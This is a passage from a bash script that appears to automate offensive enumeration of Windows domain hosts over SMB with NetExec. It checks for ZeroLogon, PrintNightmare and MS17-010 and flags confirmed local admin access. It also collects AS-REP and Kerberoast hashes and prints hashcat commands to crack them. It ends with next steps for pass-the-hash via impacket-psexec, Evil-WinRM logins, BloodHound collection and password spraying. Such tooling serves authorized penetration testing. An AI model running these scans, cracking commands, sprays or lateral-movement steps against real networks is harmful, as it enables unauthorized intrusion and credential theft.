    smb "$TARGET" -M ms17-010

run_nxc "Check for ZeroLogon (CVE-2020-1472)" \
    "${OUTPUT_DIR}/13_zerologon" \
    smb "$TARGET" -M zerologon

run_nxc "Check for PrintNightmare (CVE-2021-1675)" \
    "${OUTPUT_DIR}/13_printnightmare" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M printnightmare

run_nxc "Enumerate installed software" \
    "${OUTPUT_DIR}/13_software" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M enum_av

run_nxc "Check for WebDAV" \
    "${OUTPUT_DIR}/13_webdav" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M webdav

# ============================================================
# Summary
# ============================================================
section "SUMMARY"

echo -e "${GREEN}[+] Target:      ${TARGET}${NC}"
echo -e "${GREEN}[+] Output dir:  ${OUTPUT_DIR}${NC}"
echo -e "${GREEN}[+] End time:    $(date)${NC}"
echo ""

# Quick wins — highlight anything that popped
echo -e "${MAGENTA}[*] Quick-win check — scanning output for wins...${NC}"

grep -rl "Pwn3d!" "$OUTPUT_DIR" 2>/dev/null | while read -r f; do
    echo -e "${RED}[!!!] LOCAL ADMIN ACCESS CONFIRMED: ${f}${NC}"
done

grep -rl "\[+\]" "$OUTPUT_DIR" 2>/dev/null | head -10 | while read -r f; do
    echo -e "${GREEN}[+] Positive result in: ${f}${NC}"
done

if [ -s "${OUTPUT_DIR}/asrep_hashes.txt" ]; then
    echo -e "${RED}[!!!] ASREPRoast hashes found: ${OUTPUT_DIR}/asrep_hashes.txt${NC}"
    echo -e "      Crack with: hashcat -m 18200 ${OUTPUT_DIR}/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
fi

if [ -s "${OUTPUT_DIR}/kerberoast_hashes.txt" ]; then
    echo -e "${RED}[!!!] Kerberoast hashes found: ${OUTPUT_DIR}/kerberoast_hashes.txt${NC}"
    echo -e "      Crack with: hashcat -m 13100 ${OUTPUT_DIR}/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt"
fi

# Guest share access quick-win check
if grep -ql "READ\|WRITE" "${OUTPUT_DIR}/04b_guest_shares.txt" 2>/dev/null; then
    echo -e "${RED}[!!!] Guest account has share READ/WRITE access: ${OUTPUT_DIR}/04b_guest_shares.txt${NC}"
fi

if grep -ql "READ\|WRITE" "${OUTPUT_DIR}/04b_guest_shares_local.txt" 2>/dev/null; then
    echo -e "${RED}[!!!] Guest account (local-auth) has share READ/WRITE access: ${OUTPUT_DIR}/04b_guest_shares_local.txt${NC}"
fi

# High-value group membership quick-win check
for grp in "Domain_Admins" "Administrators" "Enterprise_Admins" "Remote_Desktop_Users" "DnsAdmins" "Backup_Operators"; do
    f="${OUTPUT_DIR}/06b_members_${grp}.txt"
    if [ -s "$f" ]; then
        echo -e "${RED}[!!!] Members found in high-value group '${grp}': ${f}${NC}"
    fi
done

if grep -ql "SidTypeUser\|SidTypeGroup" "${OUTPUT_DIR}/04c_guest_rid_brute.txt" 2>/dev/null; then
    echo -e "${RED}[!!!] Guest RID brute yielded users/groups: ${OUTPUT_DIR}/04c_guest_rid_brute.txt${NC}"
fi

if grep -ql "SidTypeUser\|SidTypeGroup" "${OUTPUT_DIR}/04c_guest_rid_brute_local.txt" 2>/dev/null; then
    echo -e "${RED}[!!!] Guest RID brute (local-auth) yielded users/groups: ${OUTPUT_DIR}/04c_guest_rid_brute_local.txt${NC}"
fi

# Non-standard group quick-win
if [ -s "${OUTPUT_DIR}/nonstandard_groups.txt" ]; then
    echo -e "${RED}[!!!] Non-standard groups identified — review member files:${NC}"
    while IFS= read -r grp; do
        safe_name=$(echo "$grp" | tr ' ' '_' | tr -cd '[:alnum:]_-')
        f="${OUTPUT_DIR}/06b_members_NONSTANDARD_${safe_name}.txt"
        if [ -s "$f" ]; then
            echo -e "    ${MAGENTA}${grp}${NC}: ${f}"
        else
            echo -e "    ${YELLOW}${grp}${NC} (no member output — may need creds or domain context)"
        fi
    done < "${OUTPUT_DIR}/nonstandard_groups.txt"
fi

# User list summary
if [ -s "${OUTPUT_DIR}/users.txt" ]; then
    total=$(grep -vc '^#\|^$' "${OUTPUT_DIR}/users.txt" 2>/dev/null)
    echo -e "${GREEN}[+] Users enumerated: ${total} — ${OUTPUT_DIR}/users.txt${NC}"
    echo -e "    Wordlist-clean:  ${OUTPUT_DIR}/usernames.txt"
fi

echo ""
echo -e "${YELLOW}[*] Suggested next steps:${NC}"
echo "    - Review users:        cat ${OUTPUT_DIR}/users.txt"
echo "    - Spray users:         cat ${OUTPUT_DIR}/usernames.txt"
echo "    - Review non-std groups: cat ${OUTPUT_DIR}/nonstandard_groups.txt"
echo "    - Review all groups:   cat ${OUTPUT_DIR}/groups.txt"
echo "    - Review shares:       cat ${OUTPUT_DIR}/04_smb_shares.txt"
echo "    - Review guest shares: cat ${OUTPUT_DIR}/04b_guest_shares.txt"
echo "    - Review group members: cat ${OUTPUT_DIR}/06b_members_Domain_Admins.txt"
echo "    - Evil-WinRM:          evil-winrm -i ${TARGET} -u <user> -p <pass>"
echo "    - Impacket PTH:        impacket-psexec <user>@${TARGET} -hashes :<NThash>"
echo "    - BloodHound ingest:   bloodhound-python -u <user> -p <pass> -d <domain> -ns ${TARGET} -c all"
echo "    - Create User List: 	 nxc ldap <target> -u <user> -p <pass> --users-export output.txt"
echo "    - Password spray:      nxc smb ${TARGET} -u ${OUTPUT_DIR}/usernames.txt -p <password> --continue-on-success"
echo ""
echo -e "${GREEN}[+] All results saved to: ${OUTPUT_DIR}/${NC}"
